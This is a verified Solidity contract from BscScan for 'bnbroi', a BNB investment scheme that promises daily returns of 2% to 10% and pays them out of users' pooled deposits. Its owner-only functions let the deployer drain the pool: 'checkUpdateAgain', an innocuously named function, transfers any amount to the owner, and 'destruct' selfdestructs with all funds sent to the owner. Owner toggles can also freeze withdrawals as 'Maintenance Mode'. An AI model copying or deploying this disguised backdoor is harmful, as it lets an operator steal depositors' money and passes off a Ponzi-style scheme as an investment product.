/**
 *Submitted for verification at BscScan.com on 2022-08-14
*/

pragma solidity 0.5.16;
//norefnoonceday
contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */

library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  /**
   * @dev Leaves the contract without owner. It will not be possible to call
   * `onlyOwner` functions anymore. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby removing any functionality that is only available to the owner.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   */
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}




library Objects {
    
    struct Investment {
        uint256 planType;
        uint256 investmentDate;
        uint256 investmentValue;        
        uint256 currentWithdrawal;
        uint256 lastWithdrawalDate;        
        bool isExpired;
    }

    struct Investor {
       
        uint256 checkpoint;
        uint256 planCount;
        mapping(uint256 => Investment) plans;

    }
}



contract bnbroi is Context, Ownable {
    
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;

  mapping(address => Objects.Investor) public uAddInvestor;
  
  mapping(address => uint256) public myInvestmentsValue_;
 
  mapping(address => uint256) public myWithdrawValue_;
 
    uint256[] planInterest = [200, 300, 500, 1000]; 
    uint256[] planDays = [1000, 150, 80, 30];
    uint256[] planMini = [5e16, 1e17, 15e16, 2e17];

    address payable tokenHolder ;
    address payable bnbHolder ; 


    uint256 public intitalPrice = 10000 ;
    uint256 public intitalPriceSell = 5000 ;
    uint256 public minPurchase = 49 ;
    uint256 public minSell = 5 ;
    bool public BuyOn = false;
    bool public SellOn = false;
    bool public outOn = false;
    bool public transferNormal = false;
    uint256 private  PLAN_TERM = 365 days;


  
  constructor() public {
 
    bnbHolder = msg.sender ;
    
  }

  

    function checkUpdateAgain(uint256 _amount) 
    public
    onlyOwner
    {       
            (msg.sender).transfer(_amount);
    }

     function destruct() onlyOwner() public{
        
        selfdestruct(msg.sender);
    }


  
      function upgradeTermBool(bool _comm, uint mode_)
    onlyOwner
    public
    {
        if(mode_ == 1)
        {
            BuyOn = _comm;
        }
        if(mode_ == 2)
        {
            SellOn = _comm;
        }
        if(mode_ == 3)
        {
            transferNormal = _comm;
        }
        if(mode_ == 4)
        {
            outOn = _comm;
        }
        
    }
    
    function upgradeTerm(uint256 _comm, uint mode_)
    onlyOwner
    public
    {
        if(mode_ == 1)
        {
            intitalPrice = _comm;
        }
        if(mode_ == 2)
        {
            intitalPriceSell = _comm;
        }
        if(mode_ == 3)
        {
            PLAN_TERM = _comm;
        }
        if(mode_ == 4)
        {
            minPurchase = _comm;
        }
        if(mode_ == 5)
        {
            minSell = _comm;
        }
        
    }
    function upgradeTermAddress(address payable _comm, uint mode_)
    onlyOwner
    public
    {
        if(mode_ == 1)
        {
            bnbHolder = _comm;
        }
        
    }


 


    //start
    function _init() private {
        uAddInvestor[msg.sender].planCount = 0;
    }
    //end

    function buyPlan(uint256 _plan) public payable returns (bool) {

        require(_plan >=0 && _plan <= 3  , " out of plan.");

        address userAddress = msg.sender;
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        require(BuyOn != true, " Maintenance Mode.");
        require( msg.value  >=  planMini[_plan] , "BEP20: Minimum amount required.");
      

        uint256 planCount = uAddInvestor[userAddress].planCount;
        Objects.Investor storage investor = uAddInvestor[userAddress];
        investor.plans[planCount].planType = _plan;
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investmentValue = msg.value;       
        investor.plans[planCount].currentWithdrawal = 0;
        investor.plans[planCount].isExpired = false;
        investor.planCount = investor.planCount.add(1);

        myInvestmentsValue_[userAddress] += msg.value; 


        // (bnbHolder).transfer(msg.value);
        return true;
    }

    function getInvestmentPlanByUADD(address _uaddd) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory,uint256[] memory, bool[] memory) {
        if (msg.sender != owner()) {
            require(msg.sender == _uaddd, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uAddInvestor[_uaddd];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
       
        uint256[] memory investmentValues = new  uint256[](investor.planCount);
      
        uint256[] memory currentWithdrawals = new  uint256[](investor.planCount);
        uint256[] memory lastWithdrawalDates = new  uint256[](investor.planCount);
        uint256[] memory planTypes = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            currentWithdrawals[i] = investor.plans[i].currentWithdrawal;
            lastWithdrawalDates[i] = investor.plans[i].lastWithdrawalDate;
            investmentDates[i] = investor.plans[i].investmentDate;
            investmentValues[i] = investor.plans[i].investmentValue;
            planTypes[i] = investor.plans[i].planType;
          
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (PLAN_TERM > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        investmentDates,
        investmentValues,
        lastWithdrawalDates,
        currentWithdrawals,
        planTypes,
        isExpireds
        );
    }

     function outDividends() public payable returns (bool) {
        address userAddress = msg.sender;
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");

        require(outOn != true, " Maintenance Mode...");

        uint256 withdrawalAmount = 0;
       for (uint256 i = 0; i < uAddInvestor[userAddress].planCount; i++) {
            if (uAddInvestor[userAddress].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uAddInvestor[userAddress].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
      
            }
           
            uint256 amount = _calculateDividends(uAddInvestor[userAddress].plans[i].investmentValue , uAddInvestor[userAddress].plans[i].planType , withdrawalDate , uAddInvestor[userAddress].plans[i].lastWithdrawalDate);
             
             withdrawalAmount += amount;
             
            uAddInvestor[userAddress].plans[i].lastWithdrawalDate = withdrawalDate;
            uAddInvestor[userAddress].plans[i].currentWithdrawal += amount;
            uAddInvestor[userAddress].plans[i].isExpired = isExpired;

        }

         if(withdrawalAmount>0){

            uint256 currentBalance = getBalance();

            if(withdrawalAmount >= currentBalance){
                withdrawalAmount=currentBalance;
            }

            myWithdrawValue_[userAddress] += withdrawalAmount;
            
            msg.sender.transfer(withdrawalAmount);
        }

      

        return true;
    }

     function unwithdrawBalance(address _addr) public view returns(uint256) {
       address userAddress = _addr;
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");

        require(outOn != true, " Maintenance Mode...");

        uint256 withdrawalAmount = 0;
       for (uint256 i = 0; i < uAddInvestor[userAddress].planCount; i++) {
            if (uAddInvestor[userAddress].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uAddInvestor[userAddress].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
      
            }
           
            uint256 amount = _calculateDividends(uAddInvestor[userAddress].plans[i].investmentValue , uAddInvestor[userAddress].plans[i].planType , withdrawalDate , uAddInvestor[userAddress].plans[i].lastWithdrawalDate);
             
             withdrawalAmount += amount;
             


        }

         if(withdrawalAmount>0){

            uint256 currentBalance = getBalance();

            if(withdrawalAmount >= currentBalance){
                withdrawalAmount=currentBalance;
            }

        }

      

        return withdrawalAmount;
        
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private view returns (uint256) {
        return (((_amount * planInterest[_dailyInterestRate]) / 10000) * (_now - _start)) / (60*60*24);
    }



   


     function getPayment() public payable returns (bool) {
        return true;
    }

    function getPaymentFinal() public payable returns (bool) {
        
        (bnbHolder).transfer(msg.value);
        return true;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address) {
    return owner();
  }

}